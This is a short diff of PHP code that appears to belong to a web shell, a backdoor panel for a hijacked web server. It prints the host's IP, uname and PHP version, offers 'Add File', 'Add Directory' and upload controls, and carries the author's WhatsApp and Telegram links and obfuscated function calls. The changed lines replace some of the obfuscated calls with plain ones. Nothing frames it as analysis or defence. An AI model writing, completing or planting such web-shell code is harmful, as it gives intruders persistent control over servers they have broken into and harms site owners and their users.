@@ -100,12 +100,11 @@ color: lime!important;
 <a href="https://wa.me/6281270303335" class="fa fa-whatsapp"></a>
 <a href="https://t.me/combetohct" class="fa fa-telegram"></a> 
 </div>
-<li>Your IP : <span style="color: white;"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></li>
-<li>Server IP : <span style="color: white;"><?php echo $_SERVER['SERVER_ADDR']; ?></span></li>
-<li>Server : <span style="color: white;"><?= $c8[0](); ?></span></li>
+<li>Server IP : <span style="color: white;"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></span></li>
+<li>Server : <span style="color: white;"><?php echo php_uname(); ?></span></li>
 <li>Server Software : <span style="color: white;"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></span></li>
 <li>Server Name : <span style="color: white;"><?php echo $_SERVER['SERVER_NAME']; ?></span></li>
-<li>PHP Version : <span style="color: white;"><?= $c8[1](); ?></span></li>
+<li>PHP Version : <span style="color: white;"><?php echo phpversion(); ?></span></li>
 <li>Add File : <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>" class="ohct">Submit</a></li>
 <li>Add Directory : <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>" class="ohct">Submit</a></li>
 <li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
